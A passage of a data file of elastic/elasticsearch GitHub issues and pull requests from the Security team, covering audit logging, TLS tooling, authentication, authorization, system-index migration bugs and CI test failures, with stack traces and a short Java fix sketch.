We normally expect audit files to be ingested to another cluster, for example via filebeat. This could be a good place to add some integrity checks.


",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,317455103,"Add certgen subcommand to print certificate information","*Original comment by @jaymode:*

In order to avoid users needing to use OpenSSL to view the generated certificates, we should add support to certgen to print out the certificate information in a human readable format.",,no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,1188544237,"Adjust deprecation notice for ingest privileges with mapping","We've failed to introduce the promised breaking behavior in v8 about the
access to mapping updates for ingest privileges.
This PR adjusts the deprecations to reflect the new plan of breaking the
behavior in v9.

Related:
https://github.com/elastic/elasticsearch/pull/85570
https://github.com/elastic/elasticsearch/pull/58784
https://github.com/elastic/elasticsearch/pull/60024

","Pinging @elastic/es-security (Team:Security)Hi @albertzaharovits, I've created a changelog YAML for you. *Note* that since this PR is labelled `>deprecation`, you need to update the changelog YAML to fill out the extended information sections.",yes,">deprecation,:Security/Authorization,Team:Security,v7.17.3,v8.6.0,"
elastic/elasticsearch,1392434310,"[CI] SecurityPluginTests testThatPluginIsLoaded failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/zniqikjuh5qcc/tests/:x-pack:plugin:security:internalClusterTest/org.elasticsearch.xpack.security.SecurityPluginTests/testThatPluginIsLoaded

**Reproduction line:**
`gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.security.SecurityPluginTests.testThatPluginIsLoaded"" -Dtests.seed=AE1E6F6D3D7BA176 -Dtests.locale=und -Dtests.timezone=NST -Druntime.java=18`

**Applicable branches:**
8.4

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.SecurityPluginTests&tests.test=testThatPluginIsLoaded

**Failure excerpt:**
```
java.io.UncheckedIOException: could not write file [C:\Users\jenkins\workspace\platform-support\129\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.security.SecurityPluginTests_AE1E6F6D3D7BA176-001\tempDir-003\SUITE-0\config\users]

  at __randomizedtesting.SeedInfo.seed([AE1E6F6D3D7BA176:4772FAD0849F1FFE]:0)
  at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:57)
  at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:66)
  at org.elasticsearch.test.SecuritySettingsSource.nodeSettings(SecuritySettingsSource.java:150)
  at org.elasticsearch.test.SecurityIntegTestCase.nodeSettings(SecurityIntegTestCase.java:212)
  at org.elasticsearch.xpack.security.SecurityPluginTests.nodeSettings(SecurityPluginTests.java:74)
  at org.elasticsearch.test.ESIntegTestCase$1.nodeSettings(ESIntegTestCase.java:2016)
  at org.elasticsearch.test.InternalTestCluster.getSettings(InternalTestCluster.java:468)
  at org.elasticsearch.test.InternalTestCluster.getNodeSettings(InternalTestCluster.java:707)
  at org.elasticsearch.test.InternalTestCluster.reset(InternalTestCluster.java:1148)
  at org.elasticsearch.test.InternalTestCluster.beforeTest(InternalTestCluster.java:1085)
  at org.elasticsearch.test.ESIntegTestCase.lambda$beforeInternal$0(ESIntegTestCase.java:362)
  at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:187)
  at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:211)
  at org.elasticsearch.test.ESIntegTestCase.beforeInternal(ESIntegTestCase.java:371)
  at org.elasticsearch.test.ESIntegTestCase.setupTestCluster(ESIntegTestCase.java:2219)
  at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
  at java.lang.reflect.Method.invoke(Method.java:577)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:980)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:833)

  Caused by: java.nio.file.AccessDeniedException: C:\Users\jenkins\workspace\platform-support\129\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.security.SecurityPluginTests_AE1E6F6D3D7BA176-001\tempDir-003\SUITE-0\config\users5166538917252910012tmp -> C:\Users\jenkins\workspace\platform-support\129\x-pack\plugin\security\build\testrun\internalClusterTest\temp\org.elasticsearch.xpack.security.SecurityPluginTests_AE1E6F6D3D7BA176-001\tempDir-003\SUITE-0\config\users

    at sun.nio.fs.WindowsException.translateToIOException(WindowsException.java:89)
    at sun.nio.fs.WindowsException.rethrowAsIOException(WindowsException.java:103)
    at sun.nio.fs.WindowsFileCopy.move(WindowsFileCopy.java:317)
    at sun.nio.fs.WindowsFileSystemProvider.move(WindowsFileSystemProvider.java:293)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at org.apache.lucene.tests.mockfile.FilterFileSystemProvider.move(FilterFileSystemProvider.java:144)
    at java.nio.file.Files.move(Files.java:1432)
    at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:52)
    at org.elasticsearch.xpack.security.test.SecurityTestUtils.writeFile(SecurityTestUtils.java:66)
    at org.elasticsearch.test.SecuritySettingsSource.nodeSettings(SecuritySettingsSource.java:150)
    at org.elasticsearch.test.SecurityIntegTestCase.nodeSettings(SecurityIntegTestCase.java:212)
    at org.elasticsearch.xpack.security.SecurityPluginTests.nodeSettings(SecurityPluginTests.java:74)
    at org.elasticsearch.test.ESIntegTestCase$1.nodeSettings(ESIntegTestCase.java:2016)
    at org.elasticsearch.test.InternalTestCluster.getSettings(InternalTestCluster.java:468)
    at org.elasticsearch.test.InternalTestCluster.getNodeSettings(InternalTestCluster.java:707)
    at org.elasticsearch.test.InternalTestCluster.reset(InternalTestCluster.java:1148)
    at org.elasticsearch.test.InternalTestCluster.beforeTest(InternalTestCluster.java:1085)
    at org.elasticsearch.test.ESIntegTestCase.lambda$beforeInternal$0(ESIntegTestCase.java:362)
    at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:187)
    at com.carrotsearch.randomizedtesting.RandomizedContext.runWithPrivateRandomness(RandomizedContext.java:211)
    at org.elasticsearch.test.ESIntegTestCase.beforeInternal(ESIntegTestCase.java:371)
    at org.elasticsearch.test.ESIntegTestCase.setupTestCluster(ESIntegTestCase.java:2219)
    at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
    at java.lang.reflect.Method.invoke(Method.java:577)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:980)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
    at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
    at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
    at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
    at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
    at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
    at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
    at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
    at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,664194068,"Support more types for OIDC claim mapping","When mapping claims to user properties, we currently only support primitive types (String, Number, Boolean) or array of these primitive types (#58524). There are however useful cases where supporting more types could be useful. For an example,  support `Map<String, String>` would allow us to map a claim like `claims.dn: federated_claims.user_id`. 

In addition, oidc standard claims include an address claim whose value is of type JSON object. It is likely that mapping of this claim can be supported if we allow type of `Map<String, PrimitiveType>`.","Pinging @elastic/es-security (:Security/Authentication)Relates: https://github.com/elastic/elasticsearch/issues/55658",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,826647440,"Provide default delete strategy for audit logs","Audit logging can be very verbose and consume lots of disk space. We leave it up to the user to define a custom retention/delete strategy (though, we provide some guidance here [1]).

It'd be helpful to have a default delete strategy for audit logs, or even a commented out delete strategy in the the `log4j2.properties` file that users could uncomment to make use of.

[1] https://www.elastic.co/guide/en/elasticsearch/reference/master/logging.html","Pinging @elastic/es-security (Team:Security)",no,":Security/Audit,Team:Security,"
elastic/elasticsearch,1236979544,"Upgrade to 8.0: Reindexing `.security` index fails if `security-index-template-v6` is still present","### Elasticsearch Version

7.17

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

Any

### Problem Description

# Symptoms

This problem can occur during the running of the `7.17` Upgrade Assistant `Migrate system indices` action:
- If `System indices migration failed. An error occurred while migrating system indices for security: exception` error is reported.
- The cluster logs will report `""reason"": ""mapping set to strict, dynamic introduction of [allow_restricted_indices] within [indices] is not allowed""`, and other similar messages for the new `.security-7-reindexed-for-8` index.
- The same error will also be reported in the output of `GET /_migration/system_features`.
- There will also be a legacy index template (e.g. `security-index-template-v6`), that matches the `.security-*` index pattern.

# Fix/Workaround

The following should be done to fix the migration issue:
1. [Delete the index template](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/indices-delete-template.html) `security-index-template-v6`.
2. [Delete](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/indices-delete-index.html) partially reindexed `.security-7-reindexed-for-8` index.
3. Rerun the `Migrate system indices` action form the Upgrade Assistant.

### Steps to Reproduce

The required reindexing step of the `.security-7` index may fail, if older index templates matching the `.security-*` index pattern are still present. This may occur on clusters that were originally created on version 5.x.

### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)I was able to reproduce this. I have tried migrating a Security index created in version 6.

If there is a template (I've only tested a legacy templates, but I think the composite templates behave the same), and the `.security*` index needs to be migrated, the settings and mappings from the template will be merged in the resulting `.security-6-reindexed-for-8`. This is a problem because most likely Security will become unusable at this point (hence the cluster will be inaccessible).

I don't think we should apply templates when we migrate the .security index.
We don't apply them when the .security index is created automatically, and we also do not apply them if the user tries to manually create it.
Can I please have someone's take on this from @elastic/es-core-infra ~@elastic/es-data-management~ ?The unexpected effects of templates on important internal indices were a big motivation for creating system indices in the first place. Unfortunately, we didn't manage to get to #42508 before the 8.0 release, so now anything we do needs to be backwards-compatible. But it's a big problem and I need to work on a solution for it.

For this specific issue, we could add a pre-migration hook to the `Security` plugin class. `Watcher` and `MachineLearning` have implemented pre-migration hooks, if you want to see an example. In Security, I imagine it would look something like this:

```java
    @Override
    public void prepareForIndicesMigration(ClusterService clusterService, Client client, ActionListener<Map<String, Object>> listener) {
        Client originClient = new OriginSettingClient(client, ClientHelper.SECURITY_ORIGIN);
        originClient.execute(
            DeleteIndexTemplateAction.INSTANCE,
            new DeleteIndexTemplateRequest(""security-index-template-v6""),
            ActionListener.wrap(response -> listener.onResponse(Map.of()), listener::onFailure)
        );
    }
```

I'm not sure if there's something better to do with the listener; the map is used for passing state to a post-upgrade hook.I tried to reproduce this with a 6.8-to-7.17 upgrade. There was no `security-index-template-v6`, so either I don't have the right sequence of versions for the upgrade, or this was a user-created template. I ended up reproducing by posting my own v1 (""legacy"") template.

The migration issues a create index request, and the code in the `MetadataCreateIndexService` class is what merges the template settings and mappings with the ones defined by the system index.

The core-infra team is going to sync up next week and we'll report back with a plan of action. This is a symptom of an old, old problem (see https://github.com/elastic/elasticsearch/issues/42508) and we need a plan for getting past it.We talked this over today and decided to try two things:
1. For 7.x, we want to add a check to the system feature migration that aborts the migration if a global template would apply to the new index that the migration creates. This is PR'd in #87262 
2. We are also looking considering it a bug that user templates can affect system indices in 8.x. A potential fix for that is here: https://github.com/elastic/elasticsearch/pull/87260

If we can get these two fixes merged, we'll prevent future 7.x-to-8.x upgrades from having this problem, and avoid having the issue keep biting us in the 8.x line of releases.",no,">bug,:Core/Infra/Core,:Security/Security,Team:Core/Infra,Team:Security,Feature:Upgrade Assistant,"
elastic/elasticsearch,317449376,"Share indices resolution code with elasticsearch core","*Original comment by @javanna:*

As a followup of LINK REDACTED, which effectively aligns indices resolution in security with the standard es behaviour, we should investigate sharing code around indices resolution with elasticsearch. The main thing about security is that `_all` is converted to all the indices that the current user is authorized for, same for wildcards expansion, but all the rest is the same. We should be able to add a public method to `MetaData` in es core that instead of relying internally on the cluster state, takes as an argument all the available indices. That way es core can call this method and provide the indices retrieved from the cluster state, while security can call it providing the filtered indices based on its own logic. After that, all of the matching logic should be the same. This would allow to remove quite some duplicated code from security. I also noticed that the restore api in es core duplicates the indices resolution code once again (in `SnapshotUtils`) for a very similar reason. Fixes that we applied to indices resolution in core didn't go to restore, which is quite bad. This change would allow to improve the restore api in core as well and remove code there too.

I meant to do this a while ago but I got trapped with all kinds of security bugs around indices resolution and never got to it. I am happy to work on this, I just have to find some time to do it.

",,no,">non-issue,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1153450647,"Improve auditing for run-as","Prior to 8.1, run-as is only supported for realm authenticated users. The audit log has the following fields for the authenticated user and the effective user:
* `user.run_by.name`
* `user.run_as.name`
* `user.run_by.realm`
* `user.run_as.realm`

Since #79809 (8.2), an API key can also perform run-as. An API key has extra information like its ID and name. It also has both its own sythetic realm (`_es_api_key`) and the ower's name and realm. In #84325, we mapped the API key owner's name to `user.run_by.name` and the synthetic realm to `user.run_by.realm`. But we still need extra fields to map the API key's ID and name as well as its owner's realm.

We should revisit and improve how auditing is done for the authenticated user and the effective user. The service account's name and type are logged under its own section (`authentication`) separated from the `user` fields. This was intentional because the intention is to have a separate section for authentication information. This is a potential candidate for expansion to accomodate the extra information for the API key.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,730843439,"Interaction between flood stage and system indices","When a node hits the flood stage watermark, all indices on that node get the `index.blocks.read_only_allow_delete` setting applied with a value of `true`. This currently applies to system indices as well as data indices. When this happens, system operations that require writes will begin to fail, which is acceptable for certain non-critical actions but for critical actions we need to consider whether failure is the right thing to do. In an effort to reduce the scope of actions that could bypass the flood stage read only block, I have attempted to enumerate what I believe we should consider as critical operations that would otherwise fail.

## Critical Actions

### Authentication

An item that would fail once the flood stage is hit is the ability to authenticate when using SAML, OpenID Connect, or delegated PKI authentication and to a certain extent Kerberos authentication. SAML, OpenID Connect, and delegated PKI authentication results in the generation of an access and refresh token that are used for subsequent access to Elasticsearch; if the document cannot be written to the security index then the authentication will fail. For Kerberos, Elasticsearch itself does not require the use of tokens for subsequent authentication but it will have a significant performance impact if tokens are not used. Kerberos authentication using Kibana requires the token service to be enabled so it will appear as users cannot authenticate using kerberos if users are accessing Elasticsearch through Kibana.

A workaround could be to use the built-in users or a file realm user. Built-in users can be disabled via the API and if this is the case then unless we allow enabling/disabling of a user to bypass the watermark then we cannot rely on built-in users. Additionally, there is a setting that completely disables our reserved realm, which contains the built-in users and that is another reason why we should not rely on them being available. A file based realm is our recommendation for recovery but we do not require one to be enabled and should not make recovering from being over the flood stage more difficult than it needs to be.

### Credential Invalidation / Logout

In the event of the security system index becoming read only, invalidation of API keys and tokens fail. We should do our best to keep these operations available as they may be needed to stop an influx of data that is pushing the cluster to the flood stage uncontrollably.

SAML and OpenID Connect logout also need the ability to write data to an index as the tokens used are invalidated as part of the logout operation.

### Disabling user

Along the same lines as above, it may become necessary to disable a user temporarily while attempting to get a cluster back up and running as a means to stop data from coming in until the cluster can be rebalanced and have any additional resources that may be needed.

### Identity Provider operations

There are probably some actions within this plugin that we may want to allow bypassing a watermark, but I am not familiar enough with the details of this to truly provide a recommendation. @tvernum @jkakavas any thoughts?

## Proposal

I'd like to propose that we allow a system index plugin to opt-in actions that would be allowed to bypass the flood stage so that they can allow data to be written to an index. I've only identified security components as those that would bypass the flood stage (as of writing) and currently believe that the Security plugin would opt-in the following transport actions:

* TransportSamlLogoutAction
* TransportSamlAuthenticateAction
* TransportSamlInvalidateSessionAction
* TransportInvalidateApiKeyAction
* TransportSetEnabledAction
* TransportDelegatePkiAuthenticationAction
* TransportOpenIdConnectAuthenticateAction
* TransportOpenIdConnectLogoutAction

An item worth consideration is a limit on the amount that we should allow critical operations to push past the flood stage; I don't think we should allow for the critical operations to push the disk out of space but if the configuration uses byte values, how far past the flood stage do we allow the critical operations to go?","Pinging @elastic/es-core-infra (:Core/Infra/Core)Pinging @elastic/es-security (:Security/Authentication)> Identity Provider operations

There's nothing that writes to the security indices here.",no,">enhancement,:Core/Infra/Core,:Security/Authentication,Team:Core/Infra,Team:Security,"
elastic/elasticsearch,756429047,"Roledescriptor remove 2xformats","This is a shot at #30104.
","Pinging @elastic/es-security (Team:Security)It looks like we now have 2 prs for this change (this one and https://github.com/elastic/elasticsearch/pull/54770)

@jkakavas, since you've started reviewing one of them already, can you see what we can do to get something merged? (when you have spare cycles)
 ",yes,":Security/Authentication,Team:Security,"
elastic/elasticsearch,776446678,"Easier Debug feature/logging for API key failures. ","**Describe the feature.**

For Support team to allow a simple way to help debug API key verification to understand why they a API key created by user X failed, the process is very limited in documentation while the process of creation and testing is often complex. 

The roles per user and role_descriptors per API key can get very granular, if we have more substantial debug logs we can ask user to enable (as superuser for example) to see why a specific API key fails or a way to help review the flow in a more easy way would help us safe a lot of time every time trying to recreate specific situations. 


","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-core-infra (Team:Core/Infra)Pinging @elastic/es-core-features (Team:Core/Features)",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1205517233,"DEB Boostrapping problems: missing cluster name and wrong certificate information","### Elasticsearch Version

Version: 8.1.2, Build: default/deb/31df9689e80bad366ac20176aa7f2371ea5eb4c1/2022-03-29T21:18:59.991429448Z, JVM: 17.0.2

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

Linux bez-boostrap-test-19xx 5.4.0-1067-gcp #71~18.04.1-Ubuntu SMP Thu Mar 3 09:50:52 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

### Problem Description

When following the [official boostrapping documentation](https://www.elastic.co/guide/en/elasticsearch/reference/current/deb.html#deb-security-configuration) for deb packages. I faced several problems. Perhaps we can try to improve the documentation to address these challenges or possibly improve the elasticsearch-reconfigure-node procedure.

1. The nodes target of a reconfigure do not set the `cluster.name` setting in the YAML file (even if the first node did set it). Either should the user be aware that this setting has to added manually on all nodes or it should be possibly set by the `elasticsearch-reconfigure-node` utility.
If this setting is not added manually on the new nodes this error is written in the logs (`java.lang.IllegalStateException: handshake with [{10.0.0.6:9300}{reHGydZ1TG2V2HrQKfynlQ}{bez-boostrap-test-nnd7}{10.0.0.6:9300}] failed: remote cluster name [mirkoscluster] does not match local cluster name [elasticsearch]`)
2. When we download elasticsearch from the DEB package the `transport.host` setting is not set. This setting defaults to localhost. IMHO when an enrollment-token for a node is created with the `/usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s node` utility we should warn the user if the `tranport.host` setting is not set or set to localhost, so that the user has the possibility to review the network settings if needed. Otherwise the new nodes cannot connect to the existing cluster.
3. The reconfigured node set the `discovery.seed_host` based on the `""nodes_addresses""` value coming from the `_security/enroll/node` API response. However (at least when I tried more than 1 time) it is a list of IP-Adresses:9300, but the transport certificates seems to be only valid for the hostnames. This prevents the new nodes to join the existing cluster, because the new nodes cannot establish an SSL Connection with the existing ones.


### Steps to Reproduce

Follow the procedure described here: https://www.elastic.co/guide/en/elasticsearch/reference/current/deb.html#_reconfigure_a_node_to_join_an_existing_cluster .

To reproduce the first bullet point, add the `cluster.name` setting in the first node before reconfigure the second node.

### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-delivery (Team:Delivery)",no,">bug,:Delivery/Packaging,:Security/Security,Team:Security,Team:Delivery,"
elastic/elasticsearch,1273292151,"Warn about flapping roles when activating user profiles","When multiple realms are configured to be under the same security domain, the [recommendation](https://www.elastic.co/guide/en/elasticsearch/reference/master/security-domain.html#security-domain-realm-roles) is to have roles consistently configured across all these realms for the same username. Otherwise, the [ActivateUserProfile API](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-activate-user-profile.html) can sync different roles for a user depending on which realm the user authenticates with. This issue is called ""flapping roles"" and should generally be a sign for mis-configuration.

We could log server side message when the situation occurs:
1. The new roles to be synced are different from those in the profile document
2. The authenticating realm is different from the one in the profile document

However, on the flip side, the log message may not be entirely accurate since the roles could have been changed by users diliberately betwen the sync (it is one of those ""weird but correct"" scenarios). Therefore the message could be causing unnecessary concerns.","Pinging @elastic/es-security (Team:Security)",no,":Security/Security,team-discuss,Team:Security,"
elastic/elasticsearch,385139836,"Enable SNI tests to run in FIPS 140 JVMs","`AbstractSimpleSecurityTransportTestCase#testInvalidSNIServerName` and `AbstractSimpleSecurityTransportTestCase#testSNIServerNameIsPropagated` can't run in a FIPS 140 JVM as is now, as they set `verification_mode` to `none` and the `TrustAllConfig` TrustManager can't be used with the Security Provider set in FIPS 140 mode. 

We could investigate if these can be rewritten so that they can run in FIPS 140 JVMs

","Pinging @elastic/es-security",no,">test,:Security/TLS,Team:Security,"
elastic/elasticsearch,444679362,"slow _cat/aliases performance with large number of aliases + security","**Elasticsearch version**: 5.6+master

**Description of the problem including expected versus actual behavior**:
`_cat/aliases` performs very slowly when cluster security is enabled. The issue was reported from a user upgrading 1.7.5 to 5.6.15 who noticed the API call was performing much slower on the later version. @imotov is able to reproduce on master.

**Steps to reproduce**:

 1. enable security
 2. create a 90000 aliases
 3. call `_cat/aliases`
","Pinging @elastic/es-securityI am concerned about adding an ""optimization"" for this as 90000 aliases would generally be discouraged. There are many aspects of the system that would be slow with such a large number of aliases.Also please note it that 5.6 is out of maintenance and would not see any additional updates at this point.We discussed this.
We do not intend to make a change to 5.6, nor do we really want to optimise for 90,000 aliases.

However, we thought that it _might_ be possible to make it so that when run as `superuser` (or any other user with access to every index, including restricted indices), it mimics the performance that you get when security is disabled. That is, the performance impact comes from trying to apply security over the list of alias/index names, and there might be cases where we can optimize that.

However:
1. we don't expect a general solution that would apply all users
2. we don't know if the proposed optimisation is safe / possible
3. there are no immediate plans to prioritise this work
 
",no,":Security/Authorization,Team:Security,"
elastic/elasticsearch,605561670,"Make `Invalidate API Key API responses` consistent","Similar to the [work we recently did](https://github.com/elastic/elasticsearch/pull/54532) for the Invalidate Tokens API , we should aim to return consistent response bodies and status codes for calls to the Invalidate API Keys API. My initial thinking is that we should reuse the decisions made there and outlined in the [PR description](https://github.com/elastic/elasticsearch/pull/54532#issue-396571241) unless we have reasons to differentiate. ",,no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,992142627,"[CI] SSLReloadDuringStartupIntegTests.testReloadDuringStartup failing","**Build scan**: https://gradle-enterprise.elastic.co/s/clwjh3wwihleq

**Repro line**: `./gradlew ':x-pack:plugin:security:internalClusterTest' --tests ""org.elasticsearch.xpack.ssl.SSLReloadDuringStartupIntegTests.testReloadDuringStartup"" -Dtests.seed=BA2B1D7CDA4F078A -Dtests.locale=en-IN -Dtests.timezone=Europe/Chisinau -Druntime.java=11`

**Reproduces locally?**: no

**Applicable branches**: master

**Failure history**: failed two times today
<!--
Link to build stats and possible indication of when this started failing and how often it fails
<https://build-stats.elastic.co/app/kibana>
-->
**Failure excerpt**:

```
java.lang.AssertionError: Shard [.security-7][0] is still locked after 5 sec waiting
at __randomizedtesting.SeedInfo.seed([BA2B1D7CDA4F078A:61F923312DF8000E]:0) |  
-- | --
